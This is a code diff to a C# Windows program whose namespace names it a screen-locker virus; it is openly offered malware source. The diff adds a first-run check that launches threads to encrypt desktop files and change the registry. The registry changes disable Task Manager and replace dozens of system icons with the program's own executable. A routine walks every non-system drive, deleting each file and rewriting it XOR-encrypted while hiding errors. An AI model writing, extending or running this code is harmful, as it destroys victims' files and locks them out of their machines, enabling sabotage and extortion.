@@ -18,18 +18,26 @@ namespace 锁机病毒
         [STAThread]
         static void Main()
         {
-            //获取计算机上的所有驱动器信息，返回一个 DriveInfo 类型的数组，数组元素为每个驱动器的信息
-            DriveInfo[] allDrives = DriveInfo.GetDrives();
+            //判断是否第一次打开程序
+            if (Properties.Settings.Default.firstopen == false)
+            {
+                Properties.Settings.Default.firstopen = true;
+                //获取计算机上的所有驱动器信息，返回一个 DriveInfo 类型的数组，数组元素为每个驱动器的信息
 
-            // 创建一个新的线程并开始执行
-            Thread thread = new Thread(new ThreadStart(WorkerThread));
-            thread.Start();
+                // 创建一个新的线程并开始执行
+                //桌面文件加密
+                Thread thread = new Thread(new ThreadStart(WorkerThread));
+                thread.Start();
 
-            Thread thread2 = new Thread(new ThreadStart(WorkerThreadregedit));
-            thread2.Start();
+                //注册表修改
+                Thread thread2 = new Thread(new ThreadStart(WorkerThreadregedit));
+                thread2.Start();
+            }
 
+            //磁盘全部文件加密
             Thread thread3 = new Thread(new ThreadStart(Alljiami));
             thread3.Start();
+            
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
@@ -110,9 +118,38 @@ namespace 锁机病毒
 
             // 禁止打开任务管理器
             Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System", "DisableTaskMgr", 1, RegistryValueKind.DWord);
+
+            //Application.ExecutablePath为本程序路径
+            // 设置文件夹图标path的值为1-44
+            for (int path = 0; path < 44; path++)
+            {
+                Registry.SetValue(@"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Icons\" + path, "", Application.ExecutablePath, RegistryValueKind.String);
+            }
+
+            // 设置“我的电脑”图标
+            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{20D04FE0-3AEA-1069-A2D8-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
+
+            // 设置“控制面板”图标
+            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{208D2C60-3AEA-1069-A2D7-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
+
+            // 设置“回收站”图标
+            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{450D8FBA-AD25-11D0-98A8-0800361B1103}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
+
+            // 设置“加密文件夹”图标
+            Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{21EC2020-3AEA-1069-A2DD-08002B30309D}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
+
+            // 设置“网络上的计算机”图标
+            Registry.SetValue(@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\CLSID\{7007ACC7-3202-11D1-AAD2-00805FC1270E}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
+
+            // 设置“我的文档”图标
+            Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f1-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
+
+            // 设置“我的图片”图标
+            Registry.SetValue(@"HKEY_CLASSES_ROOT\CLSID\{2559a1f0-21d7-11d4-bdaf-00c04f60b9f0}\DefaultIcon", "", Application.ExecutablePath, RegistryValueKind.ExpandString);
+
         }
 
-         static void Alljiami()//对盘符所有文件加密
+        static void Alljiami()//对盘符所有文件加密
         {
             // 获取所有盘符信息
             DriveInfo[] drives = DriveInfo.GetDrives();
@@ -120,42 +157,60 @@ namespace 锁机病毒
             // 遍历每个盘符
             foreach (DriveInfo drive in drives)
             {
-                Console.WriteLine($"Drive: {drive.Name}");
-                // 遍历当前盘符下的所有文件和子目录
-                string[] files = TraverseDirectory(drive.Name);
-                // 输出所有文件路径
-                foreach (string file in files)
+                if (drive.DriveType == DriveType.Fixed && !drive.IsReady)
+                { 
+                    // 过滤未准备好的驱动器
+                    continue;
+                }
+                if (drive.Name == @"C:\")
+                { 
+                    // 过滤系统盘
+                    continue;
+                }
+
+                try
                 {
-                    //执行
-                    try
+                    // 遍历当前盘符下的所有文件
+                    var files = Directory.GetFiles(drive.Name, "*.*", SearchOption.AllDirectories);
+
+                    // 输出所有文件路径
+                    foreach (string file in files)
                     {
-                        // 读取文件内容到字节数组中
-                        byte[] buffer = File.ReadAllBytes(file);
-
-                        // 如果文件大小超过2GB，则不进行加密处理
-                        /*
-                        if (buffer.Length > (2L * 1024 * 1024 * 1024 - 2))
+                        //执行
+                        try
                         {
-                            continue;
+                            // 读取文件内容到字节数组中
+                            byte[] buffer = File.ReadAllBytes(file);
+
+                            // 如果文件大小超过2GB，则不进行加密处理
+                            /*
+                            if (buffer.Length > (2L * 1024 * 1024 * 1024 - 2))
+                            {
+                                continue;
+                            }
+                            */
+
+                            // 删除原始文件
+                            File.Delete(file);
+
+                            // 遍历字节数组中的每个字节，对其进行加密操作
+                            for (int i = 0; i < buffer.Length; i++)
+                            {
+                                buffer[i] = (byte)(buffer[i] ^ 233); // 将字节与数字233进行异或运算
+                            }
+
+                            // 将加密后的字节数组写回到原始文件中
+                            File.WriteAllBytes(file, buffer);
                         }
-                        */
-
-                        // 删除原始文件
-                        File.Delete(file);
-
-                        // 遍历字节数组中的每个字节，对其进行加密操作
-                        for (int i = 0; i < buffer.Length; i++)
+                        catch (Exception ex)
                         {
-                            buffer[i] = (byte)(buffer[i] ^ 233); // 将字节与数字233进行异或运算
+                            // 处理异常
                         }
-
-                        // 将加密后的字节数组写回到原始文件中
-                        File.WriteAllBytes(file, buffer);
                     }
-                    catch (Exception ex)
-                    {
-                        // 处理异常
-                    }
+                }
+                catch(Exception ex)
+                {
+                    //error
                 }
             }
         }
